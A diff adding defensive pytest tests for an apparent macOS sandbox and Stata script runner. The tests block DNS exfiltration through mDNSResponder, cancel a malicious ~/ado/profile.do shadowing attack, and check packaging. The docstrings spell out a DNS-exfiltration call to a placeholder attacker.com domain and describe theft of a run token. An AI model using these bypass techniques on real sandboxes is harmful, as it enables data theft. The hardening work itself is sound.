@@ -348,3 +348,153 @@ def test_paths_with_special_chars_are_escaped():
         escaped = line.count('\\"')
         unescaped = total - escaped
         assert unescaped % 2 == 0, f"unbalanced quotes on line: {line!r}"
+
+
+# ---------------------------------------------------------------------------
+# Mach IPC — block the mDNSResponder DNS-exfiltration bridge
+# ---------------------------------------------------------------------------
+
+def test_mach_lookup_denies_mdnsresponder(example_profile: str):
+    """``(deny network*)`` alone is insufficient because macOS's
+    ``getaddrinfo()`` / ``res_query()`` route DNS lookups through
+    mDNSResponder, which runs OUTSIDE this sandbox and makes the
+    actual UDP packets. A sandboxed script can do
+    ``getaddrinfo("<base32-encoded-secret>.attacker.com")`` and the
+    encoded subdomain reaches the attacker's nameserver without the
+    script's own process ever touching the network.
+
+    Closing the canonical bypass requires a Mach-IPC deny for
+    mDNSResponder's global-name. The (allow mach*) blanket above must
+    be overridden by an explicit deny for these specific services.
+    """
+    assert '(deny mach-lookup' in example_profile
+    # Canonical DNS resolver — the highest-leverage exfil bridge.
+    assert '"com.apple.mDNSResponder"' in example_profile
+    # Related network-bridging daemons that could substitute for the
+    # canonical one if locked out (helper, extensions, proxy).
+    for global_name in (
+        "com.apple.mDNSResponderHelper",
+        "com.apple.dnsextensiond",
+        "com.apple.networkserviceproxy",
+        "com.apple.nehelper",
+        "com.apple.nesessionmanager",
+    ):
+        assert f'"{global_name}"' in example_profile, (
+            f"missing mach-lookup deny for {global_name}"
+        )
+
+
+def test_mach_deny_appears_after_allow(example_profile: str):
+    """SBPL is last-match-wins. The blanket ``(allow mach*)`` must
+    appear BEFORE the specific ``(deny mach-lookup ...)`` so the deny
+    wins for the listed global-names; flipped order would let the
+    allow win and re-open the bypass.
+    """
+    allow_idx = example_profile.find("(allow mach*)")
+    deny_idx = example_profile.find("(deny mach-lookup")
+    assert allow_idx >= 0 and deny_idx >= 0
+    assert allow_idx < deny_idx, (
+        "(deny mach-lookup ...) must follow (allow mach*) so "
+        "last-match-wins makes the deny effective"
+    )
+
+
+# ---------------------------------------------------------------------------
+# Stata preamble — block ``~/ado/profile.do`` shadow attack
+# ---------------------------------------------------------------------------
+
+def test_stata_preamble_drops_user_defined_programs(tmp_path):
+    """Stata batch mode (``stata -b do script.do``) sources
+    ``~/ado/profile.do`` at interpreter startup, BEFORE the user's
+    do file. Stata's program resolver checks in-memory programs
+    before searching the adopath, so a profile.do that does
+    ``program drop nora_result_regress`` followed by
+    ``program define nora_result_regress ...malicious...`` shadows
+    the staged ``nora_result_regress.ado`` even though our preamble
+    runs ``adopath + NORA_LIB_DIR``.
+
+    Concrete trigger: a malicious research-package tarball ships a
+    profile.do snippet ("for shared helpers") and the researcher
+    pastes it into ``~/ado/profile.do``. Every subsequent Stata run
+    is compromised — the malicious helper can read ``$NORA_RUN_TOKEN``
+    from env and emit a token-valid payload with whatever fields it
+    wants. ``capture program drop _all`` in our preamble forces
+    helper resolution back to the adopath (where lib_dir comes first),
+    cleaning up whatever profile.do loaded. ``_all`` does NOT touch
+    Stata's built-in commands (``regress``, ``summarize``, etc.).
+    ``capture`` suppresses errors when no user programs are loaded.
+    """
+    from nora.executor import _write_script
+
+    run_dir = tmp_path / "run"
+    run_dir.mkdir()
+    (run_dir / "lib").mkdir()
+    script_path = _write_script(run_dir, "Stata", 'reg y x\n')
+    text = script_path.read_text(encoding="utf-8")
+    # The drop MUST be present and MUST run before adopath setup,
+    # so it cleans up profile.do residue before Nora's helpers are
+    # made discoverable.
+    drop_idx = text.find("capture program drop _all")
+    adopath_idx = text.find("adopath +")
+    assert drop_idx >= 0, (
+        "Stata preamble must include `capture program drop _all` to "
+        "clear user-defined programs loaded by ~/ado/profile.do"
+    )
+    assert drop_idx < adopath_idx, (
+        "`capture program drop _all` must run before `adopath +` so "
+        "the cleanup happens before helpers become discoverable"
+    )
+
+
+# ---------------------------------------------------------------------------
+# Packaging — runtime files referenced by _stage_runtime must exist on disk
+# ---------------------------------------------------------------------------
+
+def test_packaging_spec_bundles_every_runtime_file_stage_runtime_references():
+    """The PyInstaller spec used to enumerate runtime files by hand and
+    silently dropped 8 of the 13 .ado helpers — the Python runtime
+    too. ``.app`` builds crashed with FileNotFoundError on any Stata
+    script that used a plot helper, correlation, or safe-export, and
+    on every Python script (the staged ``nora.py`` was never
+    bundled). The spec now globs the entire ``nora/runtime``
+    directory; this test pins the executor side: every filename
+    ``_stage_runtime`` reads via ``importlib.resources.files(...)
+    .joinpath(name).read_text()`` MUST exist on disk under the
+    runtime package. The spec's glob picks up "every file" so as
+    long as the file is in ``nora/runtime/``, both surfaces stay
+    aligned.
+    """
+    from importlib import resources
+
+    runtime_pkg = resources.files("nora.runtime")
+    # Names staged for each language. Keep this in sync with
+    # nora.executor._stage_runtime; a regression there is what this
+    # test is here to catch.
+    r_names = ("nora.R",)
+    stata_ados = (
+        "_nora_export_plot.ado",
+        "nora_result_regress.ado",
+        "nora_result_ttest.ado",
+        "nora_ttest.ado",
+        "nora_result_sum.ado",
+        "nora_result_tab.ado",
+        "nora_result_magnitude.ado",
+        "nora_result_correlation.ado",
+        "nora_plot_residuals.ado",
+        "nora_plot_coefficients.ado",
+        "nora_plot_interaction.ado",
+        "nora_plot_estimate_comparison.ado",
+        "nora_safe_export.ado",
+    )
+    python_names = ("nora.py",)
+
+    for name in r_names + stata_ados + python_names:
+        # resources.files(...).joinpath(name).is_file() returns True
+        # whether the resource is on disk (dev install) or backed by
+        # PyInstaller's archive — same semantics _stage_runtime
+        # relies on.
+        assert runtime_pkg.joinpath(name).is_file(), (
+            f"runtime file {name!r} is staged by executor._stage_runtime "
+            f"but missing from nora.runtime — would crash with "
+            f"FileNotFoundError in a real run"
+        )
